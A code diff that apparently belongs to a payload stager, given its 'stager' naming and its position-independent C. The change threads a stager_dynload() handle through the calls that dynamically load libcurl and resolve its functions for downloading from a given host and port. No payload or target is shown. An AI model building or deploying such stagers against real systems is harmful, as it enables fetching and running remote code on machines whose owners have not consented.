@@ -12,9 +12,11 @@
  * self-signed certificates.
  */
 
+#include "debug.h"
 #include "dynload.h"
+#include "state.h"
+#include "strings.h"
 #include "transport.h"
-#include "utils.h"
 
 /* Fixed-width rows (not a pointer array) keep this position-independent. */
 static const char SONAMES[][16] = {"libcurl.so.5", "libcurl.so.4"};
@@ -68,7 +70,7 @@ static size_t libcurl_download(const char *host, const char *port,
   void *curl_lib = NULL;
   size_t nsons = sizeof(SONAMES) / sizeof(SONAMES[0]);
   for (size_t i = 0; i < nsons; i++) {
-    curl_lib = dynload_open(SONAMES[i], RTLD_NOW | RTLD_LOCAL);
+    curl_lib = dynload_open(stager_dynload(), SONAMES[i], RTLD_NOW | RTLD_LOCAL);
     if (curl_lib) {
       debug_print("libcurl: loaded %s\n", SONAMES[i]);
       break;
@@ -78,18 +80,18 @@ static size_t libcurl_download(const char *host, const char *port,
     return 0;
 
   curl_easy_init_fn easy_init =
-      (curl_easy_init_fn)dynload_sym(curl_lib, "curl_easy_init");
+      (curl_easy_init_fn)dynload_sym(stager_dynload(), curl_lib, "curl_easy_init");
   curl_easy_setopt_fn easy_setopt =
-      (curl_easy_setopt_fn)dynload_sym(curl_lib, "curl_easy_setopt");
+      (curl_easy_setopt_fn)dynload_sym(stager_dynload(), curl_lib, "curl_easy_setopt");
   curl_easy_perform_fn easy_perform =
-      (curl_easy_perform_fn)dynload_sym(curl_lib, "curl_easy_perform");
+      (curl_easy_perform_fn)dynload_sym(stager_dynload(), curl_lib, "curl_easy_perform");
   curl_easy_cleanup_fn easy_cleanup =
-      (curl_easy_cleanup_fn)dynload_sym(curl_lib, "curl_easy_cleanup");
+      (curl_easy_cleanup_fn)dynload_sym(stager_dynload(), curl_lib, "curl_easy_cleanup");
   curl_global_init_fn global_init =
-      (curl_global_init_fn)dynload_sym(curl_lib, "curl_global_init");
+      (curl_global_init_fn)dynload_sym(stager_dynload(), curl_lib, "curl_global_init");
   if (!easy_init || !easy_setopt || !easy_perform || !easy_cleanup ||
       !global_init) {
-    dynload_close(curl_lib);
+    dynload_close(stager_dynload(), curl_lib);
     return 0;
   }
   global_init(CURL_GLOBAL_ALL);
